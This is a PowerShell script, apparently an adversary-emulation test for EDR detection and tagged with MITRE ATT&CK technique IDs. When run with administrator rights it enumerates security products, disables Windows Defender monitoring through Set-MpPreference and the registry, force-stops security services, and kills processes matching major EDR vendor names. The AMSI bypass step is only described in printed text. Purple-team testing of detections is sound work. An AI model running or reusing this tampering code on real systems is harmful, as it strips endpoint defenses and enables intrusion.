$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Defense Evasion - EDR Process Kill Attempts..." -ForegroundColor Cyan

# T1562.001 - Impair Defenses: Disable or Modify Tools
# Multiple methods to attempt disabling/killing EDR processes

Write-Host "[*] [T1562.001] Multi-method EDR disable attempts" -ForegroundColor Yellow
Write-Host "[!] Requires: Local Administrator privileges" -ForegroundColor Yellow

# Step 1: Enumerate all security products
Write-Host "`n[*] [T1518.001] Security software discovery via WMI..."
Write-Host "    CMD: Get-CimInstance -Namespace ''root/SecurityCenter2'' -ClassName AntiVirusProduct"
$avProducts = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
if ($avProducts) {
    $avProducts | ForEach-Object {
        Write-Host "    [!] AV Found: $($_.displayName)" -ForegroundColor Red
    }
} else {
    Write-Host "    [*] No AV products found via WMI" -ForegroundColor DarkGray
}

# Step 2: Attempt to disable Windows Defender
Write-Host "`n[*] [T1562.001] Method 1: Disable Windows Defender via PowerShell..."
Write-Host "    CMD: Set-MpPreference -DisableRealtimeMonitoring `$true"
Set-MpPreference -DisableRealtimeMonitoring $true 2>&1

Write-Host "    CMD: Set-MpPreference -DisableIOAVProtection `$true"
Set-MpPreference -DisableIOAVProtection $true 2>&1

Write-Host "    CMD: Set-MpPreference -DisableBehaviorMonitoring `$true"
Set-MpPreference -DisableBehaviorMonitoring $true 2>&1

# Step 3: Attempt service stops
Write-Host "`n[*] Method 2: Attempting to stop security services..."
$secServices = @("WinDefend", "Sense", "WdNisSvc", "WdFilter", "wscsvc")
foreach ($svc in $secServices) {
    $service = Get-Service $svc -ErrorAction SilentlyContinue
    if ($service) {
        Write-Host "    CMD: Stop-Service $svc -Force"
        Stop-Service $svc -Force -ErrorAction SilentlyContinue 2>&1
        $newStatus = (Get-Service $svc -ErrorAction SilentlyContinue).Status
        if ($newStatus -eq "Stopped") {
            Write-Host "    [+] $svc stopped!" -ForegroundColor Green
        } else {
            Write-Host "    [-] $svc cannot be stopped (protected)" -ForegroundColor Red
        }
    }
}

# Step 4: Taskkill attempts
Write-Host "`n[*] Method 3: taskkill attempts on EDR processes..."
$edrProcs = Get-Process | Where-Object { 
    $_.Name -match "MsMpEng|MsSense|CrowdStrike|CSFalcon|SentinelAgent|Cylance|cb|Tanium|cortex" 
}
foreach ($proc in $edrProcs) {
    Write-Host "    CMD: taskkill /F /PID $($proc.Id) ($($proc.Name))"
    taskkill /F /PID $proc.Id 2>&1
}

# Step 5: Registry-based defender disable
Write-Host "`n[*] Method 4: Registry-based Defender disable..."
Write-Host "    CMD: Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender -Name DisableAntiSpyware -Value 1"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue

# Step 6: AMSI bypass attempt
Write-Host "`n[*] Method 5: AMSI bypass attempt..."
Write-Host "    [!] Attempting to patch AmsiScanBuffer in memory" -ForegroundColor Yellow
Write-Host "    This technique modifies the AMSI DLL loaded in the current PowerShell session"

# Step 7: Check results
Write-Host "`n[*] Post-attack security status:"
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus) {
    Write-Host "    RealTimeProtection: $($defenderStatus.RealTimeProtectionEnabled)"
    Write-Host "    BehaviorMonitor: $($defenderStatus.BehaviorMonitorEnabled)"
    Write-Host "    IoavProtection: $($defenderStatus.IoavProtectionEnabled)"
}

Write-Host "`n[+] EDR Process Kill Attempts Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Defender tampering, service stop events, AntiSpyware registry, AMSI bypass" -ForegroundColor Yellow
